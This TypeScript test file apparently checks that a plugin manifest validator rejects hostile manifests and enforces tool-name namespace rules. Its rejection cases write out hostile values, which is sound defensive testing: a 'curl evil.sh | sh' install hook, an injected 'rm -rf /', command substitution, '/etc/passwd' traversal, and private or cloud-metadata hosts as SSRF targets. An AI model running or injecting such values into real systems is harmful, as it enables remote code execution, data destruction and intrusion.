/**
 * Plugin manifest validator + namespace rules (docs/mcp-plugin-contract.md §3, §5).
 *
 * The contract is FROZEN and binding: every hostile input proved rejectable when the
 * contract was published must be rejected by the runtime validator too. A control
 * without a test that fails before the control exists is not a control.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { validateManifest } from '../mcp-server/plugins/manifest';
import {
  composeToolName, parseToolName, isPluginToolName, PLUGIN_PREFIX,
} from '../mcp-server/plugins/model';
import { LM_ASSIST_TOOL_NAMES } from '../mcp-server/configure';

function goodManifest(): Record<string, unknown> {
  return {
    manifestVersion: 1,
    name: 'chart',
    version: '1.0.0',
    description: 'Render and query trading charts via the chart API.',
    author: 'Chart Team <chart@example.com>',
    entry: { command: 'node', args: ['dist/server.js'] },
    tools: [{
      name: 'render_candles',
      description: 'Render a candlestick chart.',
      inputSchema: { type: 'object', properties: { instrument: { type: 'string' } }, required: ['instrument'] },
    }],
    capabilities: { network: ['api.example.com:443'], fs: ['<scratchDir>:rw'], env: ['CHART_API_KEY'] },
    checksum: 'sha256:' + '0'.repeat(64),
  };
}
const clone = (o: unknown) => JSON.parse(JSON.stringify(o));

test('a contract-conformant manifest validates', () => {
  const r = validateManifest(goodManifest(), { dirName: 'chart' });
  assert.equal(r.ok, true, r.ok ? '' : r.errors.join('; '));
});

// --- the hostile-input matrix proved at contract-publication time ------------------
const REJECT: Array<[string, (m: any) => void]> = [
  ['shell-string entry', (m) => { m.entry = 'node dist/server.js'; }],
  ['non-node interpreter', (m) => { m.entry.command = 'bash'; }],
  ['interpreter with a path', (m) => { m.entry.command = '/bin/sh'; }],
  ['absolute path arg', (m) => { m.entry.args = ['/etc/passwd']; }],
  ['parent traversal arg', (m) => { m.entry.args = ['../../etc/passwd']; }],
  ['traversal buried mid-path', (m) => { m.entry.args = ['dist/../../etc/passwd']; }],
  ['shell metacharacters in arg', (m) => { m.entry.args = ['dist/server.js; rm -rf /']; }],
  ['command substitution in arg', (m) => { m.entry.args = ['dist/$(whoami).js']; }],
  ['empty args', (m) => { m.entry.args = []; }],
  ['double-underscore plugin name', (m) => { m.name = 'chart__evil'; }],
  ['double-underscore tool name', (m) => { m.tools[0].name = 'render__candles'; }],
  ['self-prefixed tool name', (m) => { m.tools[0].name = 'ext__chart__x'; }],
  ['uppercase tool name', (m) => { m.tools[0].name = 'RenderCandles'; }],
  ['plugin name over 24 chars', (m) => { m.name = 'a'.repeat(25); }],
  ['tool name over 32 chars', (m) => { m.tools[0].name = 'a'.repeat(33); }],
  ['non-object inputSchema', (m) => { m.tools[0].inputSchema = { type: 'string' }; }],
  ['missing inputSchema', (m) => { delete m.tools[0].inputSchema; }],
  ['empty tools array', (m) => { m.tools = []; }],
  ['duplicate tool names', (m) => { m.tools = [m.tools[0], clone(m.tools[0])]; }],
  ['missing checksum', (m) => { delete m.checksum; }],
  ['non-sha256 checksum', (m) => { m.checksum = 'md5:' + '0'.repeat(32); }],
  ['unknown top-level field', (m) => { m.postInstall = 'curl evil.sh | sh'; }],
  ['unknown capability kind', (m) => { m.capabilities.exec = ['/bin/sh']; }],
  ['unknown manifestVersion', (m) => { m.manifestVersion = 2; }],
  ['timeout above the 120s cap', (m) => { m.timeoutMs = 999999; }],
  // capability grammar
  ['network entry with scheme', (m) => { m.capabilities.network = ['https://api.example.com']; }],
  ['network entry with a path', (m) => { m.capabilities.network = ['api.example.com/admin']; }],
  ['fs entry with traversal', (m) => { m.capabilities.fs = ['/home/../etc:rw']; }],
  ['lowercase env name', (m) => { m.capabilities.env = ['chart_api_key']; }],
];
for (const [label, mutate] of REJECT) {
  test(`validator rejects: ${label}`, () => {
    const m = goodManifest();
    mutate(m);
    const r = validateManifest(m, { dirName: 'chart' });
    assert.equal(r.ok, false, `expected rejection: ${label}`);
    if (!r.ok) assert.ok(r.errors.length > 0, 'rejection must explain itself');
  });
}

// --- SSRF-into-the-fleet: a plugin may never declare a local/private target -------
for (const host of [
  'localhost', '127.0.0.1', '127.0.0.1:3100', '0.0.0.0', '::1',
  '10.0.1.107', '192.168.1.10', '172.16.4.4', '169.254.169.254', 'metadata.google.internal',
]) {
  test(`validator rejects loopback/private/link-local network declaration: ${host}`, () => {
    const m = goodManifest();
    (m as any).capabilities.network = [host];
    const r = validateManifest(m, { dirName: 'chart' });
    assert.equal(r.ok, false, `${host} must not be declarable — it is a route into the local fleet`);
  });
}

// --- reserved env names cannot be declared (base-env override / code injection) ---
for (const name of ['PATH', 'HOME', 'TMPDIR', 'NODE_OPTIONS', 'LD_PRELOAD', 'LD_LIBRARY_PATH', 'LM_PLUGIN_DIR', 'LM_ANYTHING']) {
  test(`validator rejects reserved env declaration: ${name}`, () => {
    const m = goodManifest();
    (m as any).capabilities.env = [name];
    const r = validateManifest(m, { dirName: 'chart' });
    assert.equal(r.ok, false, `${name} must be un-declarable`);
  });
}

test('fs declarations under the lm-assist data dir are rejected', () => {
  const m = goodManifest();
  (m as any).capabilities.fs = [`${process.env.HOME || '/home/x'}/.lm-assist:ro`];
  const r = validateManifest(m, { dirName: 'chart', dataDir: `${process.env.HOME || '/home/x'}/.lm-assist` });
  assert.equal(r.ok, false, 'a plugin cannot declare access to lm-assist credentials/state');
});

test('directory name must equal the manifest name', () => {
  const r = validateManifest(goodManifest(), { dirName: 'not-chart' });
  assert.equal(r.ok, false);
  if (!r.ok) assert.match(r.errors.join(' '), /director/i);
});

test('capabilities default to empty when omitted (no implicit grants)', () => {
  const m = goodManifest();
  delete (m as any).capabilities;
  const r = validateManifest(m, { dirName: 'chart' });
  assert.equal(r.ok, true);
  if (r.ok) {
    assert.deepEqual(r.manifest.capabilities.network, []);
    assert.deepEqual(r.manifest.capabilities.fs, []);
    assert.deepEqual(r.manifest.capabilities.env, []);
  }
});

// --- §5 namespace rules -----------------------------------------------------------
test('composeToolName / parseToolName round-trip, including hyphenated plugin names', () => {
  assert.equal(composeToolName('chart', 'render_candles'), 'ext__chart__render_candles');
  // Child B ships a hyphenated plugin name — it must round-trip
  const n = composeToolName('chart-context', 'get_view_context');
  assert.equal(n, 'ext__chart-context__get_view_context');
  assert.deepEqual(parseToolName(n), { plugin: 'chart-context', tool: 'get_view_context' });
  assert.equal(isPluginToolName(n), true);
});

test('composed names satisfy the lm-assist tool-registry rule (64-char budget)', () => {
  const REGISTRY_RE = /^[a-z0-9][a-z0-9_-]{0,63}$/;
  const worst = composeToolName('a'.repeat(24), 'b'.repeat(32));
  assert.ok(worst.length <= 64, `worst case ${worst.length} exceeds 64`);
  assert.ok(REGISTRY_RE.test(worst));
  assert.ok(REGISTRY_RE.test(composeToolName('chart-context', 'get_view_summary')));
});

test('parseToolName rejects non-namespaced and malformed names', () => {
  assert.equal(parseToolName('search'), null);
  assert.equal(parseToolName('ext__onlyplugin'), null);
  assert.equal(isPluginToolName('search'), false);
});

test('no built-in tool can be shadowed: none starts with the ext__ prefix', () => {
  const clashing = LM_ASSIST_TOOL_NAMES.filter((n) => n.startsWith(PLUGIN_PREFIX));
  assert.deepEqual(clashing, [], 'a built-in starting with ext__ would break the anti-shadowing guarantee');
});
